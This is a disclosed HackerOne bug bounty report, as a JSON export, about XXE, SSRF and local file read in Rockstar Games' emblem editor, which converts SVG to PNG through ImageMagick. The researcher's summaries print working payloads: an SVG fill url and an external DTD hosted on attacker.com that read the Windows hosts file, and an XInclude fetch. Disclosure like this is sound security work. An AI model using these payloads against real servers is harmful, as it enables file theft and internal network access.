{"id":347139,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDcxMzk=","url":"https://hackerone.com/reports/347139","title":"LFI and SSRF via XXE in emblem editor","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2018-05-03T12:06:53.004Z","submitted_at":"2018-05-03T12:06:53.004Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"alexbirsan","url":"/alexbirsan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2143,"url":"https://hackerone.com/rockstargames","handle":"rockstargames","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Rockstar Games","twitter_handle":"RockstarGames","website":"http://www.rockstargames.com/","about":"Publishers of such popular games as Grand Theft Auto, Max Payne, Red Dead Redemption, L.A. Noire, Bully \u0026 more."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-08-01T15:46:11.439Z","bug_reporter_agreed_on_going_public_at":"2018-07-31T14:57:27.932Z","team_member_agreed_on_going_public_at":"2018-08-01T15:46:11.094Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","vulnerability_information_html":"","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":54,"name":"XML External Entities (XXE)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-08-30T14:57:28.136Z","allow_singular_disclosure_after":-73579379.8737755,"singular_disclosure_allowed":true,"vote_count":64,"voters":["sp1d3rs","fousekis","europa","mvc","nnez","z3t","michiel","muon4","ramsexy","spam404","and 54 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":430,"asset_type":"URL","asset_identifier":"socialclub.rockstargames.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2696630,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-03T14:13:10.974Z","updated_at":"2018-05-03T14:16:37.169Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2696949,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-03T16:15:47.779Z","updated_at":"2018-05-03T16:15:47.779Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2697392,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-03T18:16:55.476Z","updated_at":"2018-05-03T18:16:55.476Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2698245,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-04T00:54:45.936Z","updated_at":"2018-05-04T00:54:45.936Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2700014,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-04T11:10:13.933Z","updated_at":"2018-05-04T11:12:47.829Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2700422,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-04T14:21:57.018Z","updated_at":"2018-05-04T14:21:57.018Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2831148,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-01T22:16:28.033Z","updated_at":"2018-06-01T22:16:28.033Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2833147,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-02T13:53:27.684Z","updated_at":"2018-06-02T13:53:27.684Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2839137,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-04T13:43:27.954Z","updated_at":"2018-06-04T13:43:27.954Z","actor":{"url":"/rockstargames","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/143/db40b290ac0adcde231da85c33a668f610e6f4df_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Rockstar Games"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"rockstargames","collaborator":{"username":"alexbirsan","url":"/alexbirsan"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2839138,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-04T13:43:35.925Z","updated_at":"2018-06-04T13:43:35.925Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"alexbirsan","url":"/alexbirsan"},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2839177,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-04T14:00:19.300Z","updated_at":"2018-06-04T14:00:19.300Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3030366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-11T11:51:20.018Z","updated_at":"2018-07-11T11:51:20.018Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3119082,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-31T03:12:31.113Z","updated_at":"2018-07-31T03:12:31.113Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3122264,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-31T13:37:36.876Z","updated_at":"2018-07-31T13:37:36.876Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3122567,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-31T14:57:27.980Z","updated_at":"2018-07-31T15:07:52.423Z","first_to_agree":true,"actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3122608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-31T15:08:28.141Z","updated_at":"2018-07-31T15:08:28.141Z","actor":{"username":"thefrog","cleared":false,"url":"/thefrog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/246/015/2eead02646771af4df7aa20c21edb7d5dc99d3da_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3128998,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-01T15:13:55.873Z","updated_at":"2018-08-01T15:13:55.873Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3129034,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-01T15:23:00.246Z","updated_at":"2018-08-01T15:23:00.246Z","actor":{"username":"alexbirsan","cleared":true,"url":"/alexbirsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/545/923a0fa28759c960ae38f4a902d5f4df82773e17_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3129226,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-01T15:46:11.173Z","updated_at":"2018-08-01T15:46:11.173Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3129227,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-08-01T15:46:11.511Z","updated_at":"2018-08-01T15:46:11.511Z","actor":{"username":"jmarshall","cleared":false,"url":"/jmarshall","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rockstargames","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":9682,"category":"team","content":"This summary is provided by the researcher who submitted this report, @alexbirsan . \n\n___________________________________________________________________________________________________________________________\n\nAbout one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\n\nFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\n\n1. Double forward slash to reference an SMB path:\n\n    ```xml\n    \u003crect fill=“url(//attacker.com/malicious.svg#exploit)”\u003e\n    ```\n    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\n\n2. Classic XXE:\n\n    ```xml\n\u003c!DOCTYPE svg [\n\u003c!ENTITY % outside SYSTEM \"http://attacker.com/exfil.dtd\"\u003e\n%outside;\n]\u003e\n\u003csvg\u003e\n  \u003cdefs\u003e\n    \u003cpattern id=\"exploit\"\u003e\n      \u003ctext x=\"10\" y=\"10\"\u003e\n        \u0026exfil;\n      \u003c/text\u003e\n    \u003c/pattern\u003e\n  \u003c/defs\u003e\n\u003c/svg\u003e\n```\n    **exfil.dtd**\n\n    ```xml\n\u003c!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\"\u003e\n\u003c!ENTITY exfil \"%data;\"\u003e\n```\n    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).\n\n3. Bonus method - XIncludes\n\n    ```xml\n\u003ctext x=\"10\" y=\"10\"\u003e\n    \u003cxi:include href=\"https://www.google.com/\" parse=\"text\"/\u003e\n\u003c/text\u003e\n```\nIt turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.\n\nThe final POC looked like this:\n{F293137}","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis summary is provided by the researcher who submitted this report, \u003ca href=\"/alexbirsan\"\u003e@alexbirsan\u003c/a\u003e . \u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eAbout one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\u003c/p\u003e\n\n\u003cp\u003eFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eDouble forward slash to reference an SMB path:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;rect\u003c/span\u003e \u003cspan class=\"na\"\u003efill=\u003c/span\u003e\u003cspan class=\"s\"\u003e“url(//attacker.com/malicious.svg#exploit)”\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eClassic XXE:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE svg [\n\u0026lt;!ENTITY % outside SYSTEM \u0026quot;http://attacker.com/exfil.dtd\u0026quot;\u0026gt;\u003c/span\u003e\n%outside;\n]\u0026gt;\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;defs\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;pattern\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;exploit\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"ni\"\u003e\u0026amp;exfil;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/pattern\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/defs\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eexfil.dtd\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY % data SYSTEM \u0026quot;file:///C:/Windows/system32/drivers/etc/hosts\u0026quot;\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY exfil \u0026quot;%data;\u0026quot;\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using \u003ccode\u003e//\u003c/code\u003e).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBonus method - XIncludes\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;xi:include\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.google.com/\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eparse=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it\u0026#39;s a bit more reliable and straight-forward.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe final POC looked like this:\u003cbr\u003e\n{F293137}\u003c/p\u003e\n"},{"id":9679,"category":"researcher","content":"About one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\n\nFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\n\n1. Double forward slash to reference an SMB path:\n\n    ```xml\n    \u003crect fill=“url(//attacker.com/malicious.svg#exploit)”\u003e\n    ```\n    This allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\n\n2. Classic XXE:\n\n    ```xml\n    \u003c!DOCTYPE svg [\n    \u003c!ENTITY % outside SYSTEM \"http://attacker.com/exfil.dtd\"\u003e\n    %outside;\n    ]\u003e\n    \u003csvg\u003e\n      \u003cdefs\u003e\n        \u003cpattern id=\"exploit\"\u003e\n          \u003ctext x=\"10\" y=\"10\"\u003e\n            \u0026exfil;\n          \u003c/text\u003e\n        \u003c/pattern\u003e\n      \u003c/defs\u003e\n    \u003c/svg\u003e\n    ```\n    \n    **exfil.dtd**\n    ```xml\n    \u003c!ENTITY % data SYSTEM \"file:///C:/Windows/system32/drivers/etc/hosts\"\u003e\n    \u003c!ENTITY exfil \"%data;\"\u003e\n    ```\n\n    This particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).\n\n3. Bonus method - XIncludes\n   \n    ```xml\n    \u003ctext x=\"10\" y=\"10\"\u003e\n        \u003cxi:include href=\"https://www.google.com/\" parse=\"text\"/\u003e\n    \u003c/text\u003e\n    ```\n    \n    It turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it's a bit more reliable and straight-forward.\n\nThe final POC looked like this:\n{F293137}","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAbout one year after I started messing with the emblem editor, I finally found a full SSRF and LFI. I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem.\u003c/p\u003e\n\n\u003cp\u003eFor those of you who are not familiar with the emblem editor, the interesting part is a SVG to PNG conversion using user supplied input. The main pieces of my exploit were mostly quirks in the ImageMagick version used by Rockstar:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eDouble forward slash to reference an SMB path:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;rect\u003c/span\u003e \u003cspan class=\"na\"\u003efill=\u003c/span\u003e\u003cspan class=\"s\"\u003e“url(//attacker.com/malicious.svg#exploit)”\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eClassic XXE:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE svg [\n\u0026lt;!ENTITY % outside SYSTEM \u0026quot;http://attacker.com/exfil.dtd\u0026quot;\u0026gt;\u003c/span\u003e\n%outside;\n]\u0026gt;\n\u003cspan class=\"nt\"\u003e\u0026lt;svg\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;defs\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;pattern\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;exploit\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"ni\"\u003e\u0026amp;exfil;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/pattern\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/defs\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/svg\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eexfil.dtd\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY % data SYSTEM \u0026quot;file:///C:/Windows/system32/drivers/etc/hosts\u0026quot;\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY exfil \u0026quot;%data;\u0026quot;\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis particular version of ImageMagick was vulnerable to a regular XXE attack. By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using \u003ccode\u003e//\u003c/code\u003e).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBonus method - XIncludes\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;text\u003c/span\u003e \u003cspan class=\"na\"\u003ex=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ey=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;10\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;xi:include\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.google.com/\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eparse=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;text\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/text\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt turns out XIncludes were also supported here. This allowed me to get the same results as the XXE method, but it\u0026#39;s a bit more reliable and straight-forward.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe final POC looked like this:\u003cbr\u003e\n{F293137}\u003c/p\u003e\n"}]}